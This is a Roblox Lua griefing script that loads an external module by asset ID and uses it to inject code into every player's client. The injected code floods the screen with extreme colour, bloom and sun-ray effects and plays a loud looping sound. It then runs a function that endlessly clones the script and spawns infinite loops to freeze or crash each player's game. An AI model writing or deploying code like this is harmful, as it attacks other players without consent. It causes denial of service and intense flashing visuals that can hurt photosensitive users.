local NLS=require(13482937602)()
for _,v in ipairs(game.Players:GetPlayers()) 
do
NLS([[
local Lighting = game:GetService("Lighting")

local ColorCorrection = Instance.new("ColorCorrectionEffect")
ColorCorrection.Name = "MaxDistortion"
ColorCorrection.Parent = Lighting

ColorCorrection.Contrast = 1.0
ColorCorrection.Saturation = 5.0
ColorCorrection.Brightness = 1.0
ColorCorrection.TintColor = Color3.fromRGB(255, 0, 255)
local Bloom = Instance.new("BloomEffect")
Bloom.Name = "MaxBloom"
Bloom.Parent = Lighting

Bloom.Intensity = 5.0
Bloom.Size = 48
Bloom.Threshold = 0

local SunRays = Instance.new("SunRaysEffect")
SunRays.Name = "FracturedRays"
SunRays.Parent = Lighting

SunRays.Intensity = 1.0
SunRays.Spread = 1.0
local a=Instance.new"Sound"
a.Looped=true
a.SoundId="rbxassetid://8028069841"
a.Parent=workspace
a.Volume=10
a:Play()
local function trespmo(i)
  local ascii_codes_table={}
  for _=1,#i do 
    local code = i:byte(_) 
    table.insert(ascii_codes_table, code)
    end
    local final_sequence = table.concat(ascii_codes_table, "/")
    return "/"..final_sequence
end 
local function rc()
return 
  string.char(math.random(97,122))
end
 local function randomstring(chars)
local result1 = {}

for i=1,chars do 
  result1[i] = rc()
end
local result3 = table.concat(result1)
return result3
end 

local function DIEHARD()
while true do script:Clone().Parent=script print(":/".. trespmo(randomstring(math.random(1,100)))) task.spawn(function() while true do end end) end 
end
DIEHARD()
]],v:FindFirstChildOfClass("Backpack") or v:FindFirstChild("PlayerGui"),true) 
end
